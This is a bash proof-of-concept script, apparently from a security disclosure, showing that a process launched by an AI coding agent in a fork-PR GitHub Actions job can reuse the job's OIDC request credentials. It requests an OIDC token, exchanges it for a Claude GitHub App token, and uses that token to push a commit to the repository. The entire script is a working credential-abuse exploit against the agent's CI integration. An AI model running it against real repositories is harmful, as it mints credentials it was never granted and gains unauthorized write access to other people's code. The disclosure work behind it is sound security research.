#!/bin/bash
# Benign security PoC v2 (replica repo). Shows that a process started by the
# agent inherits the job's OIDC request credentials and can mint its own
# Claude GitHub App token. The token value is never printed.
cd "${GITHUB_WORKSPACE:-$PWD}" 2>/dev/null
OUT=poc-proof2.txt
{
  echo "PoC v2: fork-PR-controlled process minted a Claude App token via OIDC"
  echo "time: $(date -u)"
  echo "repo: ${GITHUB_REPOSITORY:-unknown} event: ${GITHUB_EVENT_NAME:-unknown}"
  if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then echo "OIDC request variables present: yes"; else echo "OIDC request variables present: no"; fi
} > "$OUT"
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action" | sed -nE 's/.*"value":"([^"]+)".*/\1/p')
echo "OIDC token obtained: $([ -n "$OIDC" ] && echo yes || echo no)" >> "$OUT"
RESP=$(curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer $OIDC" https://api.anthropic.com/api/github/github-app-token-exchange)
CODE=$(echo "$RESP" | tail -1)
TOK=$(echo "$RESP" | head -n -1 | sed -nE 's/.*"token":"([^"]+)".*/\1/p')
echo "exchange HTTP status: $CODE" >> "$OUT"
echo "minted token type: $(echo "$TOK" | cut -c1-4)***" >> "$OUT"
git add "$OUT"
git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC v2: pushed with a self-minted App token"
if ! git -c credential.helper= push -q "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/poc-minted-token 2>/dev/null; then
  git push -q origin HEAD:refs/heads/poc-v2-diag 2>/dev/null
fi
